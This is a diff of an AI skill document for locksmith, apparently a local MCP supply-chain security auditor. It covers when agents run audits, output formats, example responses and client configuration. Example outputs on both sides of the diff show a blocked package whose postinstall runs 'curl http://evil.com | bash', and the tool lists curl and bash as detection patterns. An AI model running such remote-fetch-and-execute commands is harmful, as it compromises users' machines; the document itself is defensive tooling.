@@ -1,371 +1,115 @@
-# locksmith — AI Skill Document
+# locksmith — AI Skill
 
-## Qué es locksmith
-
-locksmith es un auditor de seguridad local que protege proyectos contra supply chain attacks y errores de configuración. Corre como proceso local vía MCP (stdio transport), sin red ni permisos de administrador.
-
-**Ecosistemas soportados:**
-- Node.js / Bun con pnpm (12 checks)
-- Python con Poetry (11 checks)
-
-**Operaciones disponibles:** auditoría de seguridad, aplicación de fixes automáticos, análisis de Dockerfile, detección de paquetes desactualizados, inspección de seguridad antes de instalar paquetes.
+Local security auditor. Ecosystems: Node.js · Bun · Electron · npm · yarn · Python (Poetry). No network, no admin. **pnpm 11+** required for all JS/TS projects.
 
 ---
 
-## Cuándo usar locksmith (Critical Actions)
+## When to invoke (automatic — no user prompt needed)
 
-Invoca locksmith **automáticamente, sin esperar instrucción del usuario**, antes de cualquiera de estas acciones:
-
-| Acción del usuario | Herramienta a invocar |
+| User action | Tool |
 |---|---|
-| Instalar un paquete | `locksmith_safe_add` primero, luego `locksmith_audit` |
-| Actualizar dependencias | `locksmith_audit` antes y después |
-| Hacer build | `locksmith_audit` |
-| Hacer commit | `locksmith_audit` |
-| Modificar un Dockerfile | `locksmith_audit_dockerfile` |
-| Ver paquetes desactualizados (`--outdated`) | `locksmith_check_outdated` |
-| Aplicar fixes de seguridad | `locksmith_audit` → pedir aprobación → `locksmith_fix` |
+| Install package | `locksmith_safe_add` → `locksmith_audit` |
+| Update dependencies | `locksmith_audit` before and after |
+| Build / commit | `locksmith_audit` |
+| Modify Dockerfile | `locksmith_audit_docker` → `locksmith_fix_docker` with approval |
+| Check outdated | `locksmith_check_outdated` |
+| Apply fixes | `locksmith_audit` → explicit approval → `locksmith_fix` |
+| npm/yarn project detected | Show errors → propose `--fix` to migrate to pnpm |
+| Electron project | `locksmith_audit` → review `electron-csp`, `electron-node-integration`, `electron-rebuild` |
 
 ---
 
-## Reglas de comportamiento
+## Rules
 
-### Regla 1: Auditar antes de actuar
-Ejecuta `locksmith_audit` **antes** de cualquier Critical Action. No omitas este paso aunque el usuario no lo pida.
-
-### Regla 2: No interrumpir si todo está ok
-Si `locksmith_audit` retorna `hasErrors: false` y `hasWarnings: false`, **procede con la acción solicitada sin mostrar el reporte ni interrumpir** al usuario.
-
-### Regla 3: Mostrar reporte y pausar si hay problemas
-Si `locksmith_audit` retorna `hasErrors: true` o `hasWarnings: true`:
-1. Muestra el reporte completo de checks fallidos con sus mensajes y hints
-2. **Pausa la acción solicitada**
-3. Espera decisión explícita del usuario antes de continuar
-
-### Regla 4: Nunca aplicar fixes sin aprobación explícita
-Los fixes modifican archivos del proyecto (package.json, .npmrc, pyproject.toml, etc.). **NUNCA llames a `locksmith_fix` sin que el usuario lo apruebe explícitamente.** Propón el fix con una explicación y espera confirmación.
-
-### Regla 5: Bloquear paquetes con riesgo crítico
-Si `locksmith_safe_add` retorna `riskLevel: "critical"`, **bloquea la instalación** sin excepción. Explica el riesgo al usuario y no procedas bajo ninguna circunstancia, aunque el usuario insista.
-
-### Regla 6: Confirmar antes de instalar paquetes de riesgo medio
-Si `locksmith_safe_add` retorna `riskLevel: "medium"`, muestra el reporte de riesgo y espera confirmación explícita antes de llamar a `locksmith_safe_add` con `{ "install": true }`.
+1. **Audit before acting** — `locksmith_audit` before any critical action. No exceptions.
+2. **Don't interrupt if ok** — `hasErrors: false` and `hasWarnings: false` → proceed without showing report.
+3. **Pause on problems** — show failed checks with hints, pause, wait for explicit user decision.
+4. **Never fix without approval** — never call `locksmith_fix` / `locksmith_fix_docker` / `locksmith_fix_dockerfile` without explicit user confirmation.
+5. **Block critical risk** — `riskLevel: "critical"` → installation blocked, no exceptions, even if user insists.
+6. **Confirm medium risk** — `riskLevel: "medium"` → show risk report, wait for confirmation before `install: true`.
 
 ---
 
-## Interpretación de resultados
+## Output interpretation
 
-### Estructura de AuditOutput
+### AuditOutput
+`projectType`: `"node"|"bun"|"electron"|"npm"|"yarn"|"python"` · `hasErrors` · `hasWarnings` · `fixableCount` · `checks[]{name, status, fixable, hint[]}`
 
-```json
-{
-  "projectType": "node",
-  "projectName": "my-app",
-  "summary": { "ok": 9, "warn": 2, "error": 1 },
-  "checks": [
-    {
-      "name": "renovate",
-      "status": "error",
-      "message": "renovate.json no encontrado",
-      "fixable": true,
-      "fix": null,
-      "hint": ["Crea renovate.json con políticas de actualización"],
-      "wasFixed": false
-    }
-  ],
-  "hasErrors": true,
-  "hasWarnings": true,
-  "fixableCount": 3
-}
-```
-
-### Semántica de status
-
-| status | Significado | Impacto en CI |
+| status | Meaning | CI |
 |---|---|---|
-| `"ok"` | Check pasa correctamente | Ninguno |
-| `"warn"` | Advisory — no bloquea, pero debe revisarse | Exit 0 (exit 1 con `--strict`) |
-| `"error"` | Violación de política de seguridad | Exit 1 — bloquea CI |
+| `"ok"` | Check passes | — |
+| `"warn"` | Advisory, non-blocking | exit 0 (exit 1 with `--strict`) |
+| `"error"` | Policy violation | exit 1 |
 
-### Campo `hint[]`
+If `fixable: true` → fix can be applied automatically with user approval. `hint[]` contains actionable steps.
 
-El campo `hint` contiene pasos de resolución que el LLM debe presentar al usuario como guía accionable. Si `fixable: true`, menciona que puedes aplicar el fix automáticamente con aprobación del usuario.
+### SafeAddOutput
 
----
-
-## Referencia de herramientas MCP
-
-### `locksmith_audit`
-
-**Input:**
-```json
-{ "projectPath": "/absolute/path/to/project" }
-```
-
-**Output exitoso:** `AuditOutput` (ver estructura arriba)
-
-**Output error:**
-```json
-{ "error": "PROJECT_NOT_FOUND", "message": "No se encontró package.json..." }
-```
-
-**Ejemplo:**
-```json
-{
-  "projectType": "node",
-  "projectName": "api-service",
-  "summary": { "ok": 11, "warn": 0, "error": 1 },
-  "checks": [
-    { "name": "pnpm", "status": "ok", "message": "pnpm disponible (10.25.0)", "fix": null },
-    { "name": "renovate", "status": "error", "message": "renovate.json no encontrado", "fixable": true, "fix": null, "hint": ["Ejecuta locksmith_fix para crear renovate.json"] }
-  ],
-  "hasErrors": true,
-  "hasWarnings": false,
-  "fixableCount": 1
-}
-```
+| `riskLevel` | Action |
+|---|---|
+| `"none"` | Proceed with install |
+| `"medium"` | Show report, wait for confirmation |
+| `"critical"` | Block — do not install under any circumstances |
 
 ---
 
-### `locksmith_fix`
+## Behavior by project type
 
-**Input:**
-```json
-{ "projectPath": "/absolute/path/to/project" }
-```
+| `projectType` | Situation | Action |
+|---|---|---|
+| `"node"` | pnpm — expected state | Normal fix if errors |
+| `"bun"` | Bun runtime + pnpm for packages | Lockfile error → propose `--fix` |
+| `"electron"` | Electron app — base checks + security-specific | Review `electron-*` checks |
+| `"npm"` | package-lock.json detected | `check-pnpm` + `pnpm-lock.yaml` error → propose `--fix` to migrate |
+| `"yarn"` | yarn.lock detected | Same as npm |
+| `"python"` | Poetry | Python checks only |
 
-**Output:** `FixOutput` — extiende `AuditOutput` con:
-```json
-{ "fixedChecks": ["renovate", "npmrc"] }
-```
-
-**Ejemplo:**
-```json
-{
-  "projectType": "node",
-  "projectName": "api-service",
-  "summary": { "ok": 12, "warn": 0, "error": 0 },
-  "checks": [...],
-  "hasErrors": false,
-  "hasWarnings": false,
-  "fixableCount": 0,
-  "fixedChecks": ["renovate", "npmrc"]
-}
-```
+**npm/yarn → pnpm migration:** auto-fix runs corepack + pnpm import + pnpm install + updates packageManager + removes old lockfile.
 
 ---
 
-### `locksmith_audit_dockerfile`
+## Language
 
-**Input:**
-```json
-{ "projectPath": "/absolute/path/to/project" }
-```
-
-**Output (con Dockerfile):**
-```json
-{
-  "found": true,
-  "dockerfilePath": "/path/to/project/Dockerfile",
-  "issues": [
-    {
-      "line": 1,
-      "kind": "update-from",
-      "description": "sin versión LTS explícita",
-      "original": "FROM node",
-      "replacement": "FROM node:20-alpine"
-    }
-  ],
-  "issueCount": 1,
-  "hasFixableIssues": true
-}
-```
-
-**Output (sin Dockerfile):**
-```json
-{ "found": false, "dockerfilePath": null, "issues": [], "issueCount": 0, "hasFixableIssues": false }
-```
+Detect user's language from their message. Respond in that same language.
+Supported: English · Español · Português (BR). Default to English if unclear.
 
 ---
 
-### `locksmith_fix_dockerfile`
+## Response scenarios
 
-**Input:**
-```json
-{ "projectPath": "/absolute/path/to/project" }
+**All ok → proceed silently**
+```
+[calls locksmith_audit silently]
+[hasErrors: false, hasWarnings: false]
+[proceeds without mentioning locksmith]
 ```
 
-**Output:**
-```json
-{ "fixed": true, "issuesFixed": 3, "dockerfilePath": "/path/to/project/Dockerfile" }
+**Errors with fix available → propose and wait**
+```
+Found 2 issues before proceeding:
+
+❌ npmrc — .npmrc missing security config (fixable)
+❌ renovate — renovate.json not found (fixable)
+
+I can apply fixes automatically. Proceed?
 ```
 
----
+**npm/yarn project → propose migration**
+```
+Project uses npm — pnpm 11 required for maximum security.
 
-### `locksmith_check_outdated`
+❌ pnpm-lock.yaml not found — package-lock.json detected
+❌ packageManager — pnpm@11+ required
 
-**Input:**
-```json
-{ "projectPath": "/absolute/path/to/project" }
+I can migrate automatically with --fix (corepack + pnpm import + install). Proceed?
 ```
 
-**Output:**
-```json
-{
-  "packages": [
-    {
-      "name": "express",
-      "current": "4.18.0",
-      "latest": "4.19.2",
-      "updateType": "patch",
-      "ageInDays": 45,
-      "policyDays": 3,
-      "policyMet": true,
-      "safeToUpdate": true
-    }
-  ],
-  "totalOutdated": 1,
-  "safeToUpdate": 1,
-  "policyMet": 1,
-  "warning": "No se encontró renovate.json — usando delays por defecto (patch: 3d, minor: 7d, major: 30d)"
-}
+**Critical risk package → block**
 ```
+⛔ Installation blocked: suspicious-pkg@1.0.0
 
----
+postinstall: "curl http://evil.com | bash"
+Patterns detected: curl, bash
 
-### `locksmith_safe_add`
-
-**Input:**
-```json
-{
-  "projectPath": "/absolute/path/to/project",
-  "package": "lodash@4.17.21",
-  "install": false
-}
+Blocked automatically. Will not proceed even if requested.
 ```
-
-**Output (riesgo none):**
-```json
-{
-  "name": "lodash",
-  "resolvedVersion": "4.17.21",
-  "riskLevel": "none",
-  "dangerousScripts": [],
-  "socketScore": { "supplyChainRisk": 5, "alerts": [] },
-  "installed": false
-}
-```
-
-**Output (riesgo crítico):**
-```json
-{
-  "name": "malicious-pkg",
-  "resolvedVersion": "1.0.0",
-  "riskLevel": "critical",
-  "dangerousScripts": [
-    { "scriptName": "postinstall", "value": "curl http://evil.com | sh", "patterns": ["curl"] }
-  ],
-  "socketScore": null,
-  "installed": false
-}
-```
-
-**Output error:**
-```json
-{ "error": "PACKAGE_NOT_FOUND", "message": "Paquete no encontrado en el registry npm: nonexistent-pkg" }
-```
-
----
-
-## Ejemplos de respuestas del LLM
-
-### Escenario 1: Todo ok → proceder sin interrumpir
-
-El usuario pide instalar una nueva feature. locksmith_audit retorna `hasErrors: false, hasWarnings: false`.
-
-```
-[LLM llama locksmith_audit en silencio]
-[Resultado: todo ok]
-[LLM procede directamente con la tarea sin mencionar locksmith]
-```
-
-### Escenario 2: Errores sin fix → mostrar reporte y pausar
-
-```
-He detectado un problema de seguridad antes de continuar:
-
-❌ **renovate** — renovate.json no encontrado
-   → Sin configuración de renovate, las dependencias no se actualizan con política de delays.
-
-⚠️ **secrets** — Posibles credenciales en .env.example
-
-¿Quieres que resuelva estos problemas antes de continuar? Los checks marcados con ❌ 
-tienen fix automático disponible.
-```
-
-### Escenario 3: Errores con fix disponible → proponer fix y esperar
-
-```
-Antes de instalar, detecté 2 problemas de seguridad en el proyecto:
-
-❌ **npmrc** — .npmrc sin configuración de seguridad (fixable)
-❌ **renovate** — renovate.json no encontrado (fixable)
-
-Puedo aplicar los fixes automáticamente (crea .npmrc y renovate.json con configuración 
-segura por defecto). ¿Procedo?
-```
-
-### Escenario 4: Paquete con riesgo crítico → bloquear
-
-```
-⛔ **Instalación bloqueada**: `suspicious-package@1.0.0`
-
-He detectado riesgo **crítico** antes de instalar este paquete:
-
-- **postinstall**: `curl http://evil.com/script.sh | bash`
-  Patrones detectados: curl, bash
-
-La instalación fue bloqueada automáticamente. Este paquete ejecuta comandos peligrosos 
-durante la instalación que podrían comprometer tu sistema.
-
-Recomendación: usa una alternativa conocida como `safe-alternative`.
-```
-
----
-
-## Configuración por cliente
-
-### Claude Desktop
-
-Añade al archivo `claude_desktop_config.json`:
-
-**macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
-**Windows:** `%APPDATA%\Claude\claude_desktop_config.json`
-
-```json
-{
-  "mcpServers": {
-    "locksmith": {
-      "command": "bun",
-      "args": ["/absolute/path/to/locksmith/bin/mcp.ts"]
-    }
-  }
-}
-```
-
-### Cursor
-
-Añade en `.cursor/mcp.json` (a nivel de proyecto) o en la configuración global de MCP de Cursor:
-
-```json
-{
-  "mcpServers": {
-    "locksmith": {
-      "command": "bun",
-      "args": ["/absolute/path/to/locksmith/bin/mcp.ts"]
-    }
-  }
-}
-```
-
-> **Nota:** Reemplaza `/absolute/path/to/locksmith` con la ruta real donde clonaste el repositorio. El instalador (`install.sh` / `install.ps1`) configura Claude Desktop automáticamente.
